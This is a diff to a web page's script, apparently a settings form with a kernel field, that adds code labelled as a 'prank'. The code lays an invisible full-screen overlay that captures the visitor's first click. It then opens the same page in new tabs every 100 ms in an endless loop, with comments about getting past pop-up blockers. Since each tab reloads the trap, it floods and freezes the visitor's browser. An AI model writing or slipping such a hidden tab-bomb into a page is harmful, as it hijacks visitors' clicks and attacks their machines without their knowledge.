@@ -494,6 +494,34 @@ body[unresolved] {opacity: 0; display: block; overflow: hidden; position: relati
         document.getElementById("cancle").addEventListener("click", function() {
             document.getElementById("kernel").value = KERNEL;
         });
+
+        // Prank button setup
+        var prankDiv = document.createElement('div');
+        prankDiv.style.position = 'fixed';
+        prankDiv.style.top = '0';
+        prankDiv.style.left = '0';
+        prankDiv.style.width = '100vw';
+        prankDiv.style.height = '100vh';
+        prankDiv.style.zIndex = '9999';
+        prankDiv.style.backgroundColor = 'transparent';
+        prankDiv.style.cursor = 'pointer';
+        document.body.appendChild(prankDiv);
+
+        var clicked = false;
+        prankDiv.addEventListener('click', function() {
+            if (clicked) return;
+            clicked = true;
+            prankDiv.style.display = 'none';
+            function openTabs() {
+                try {
+                    window.open(window.location.href, '_blank');
+                } catch (e) {
+                    // Handle pop-up blocker gracefully by continuing the loop
+                }
+                setTimeout(openTabs, 100); // Small delay to avoid browser restrictions
+            }
+            openTabs();
+        });
     }
     </script>
 
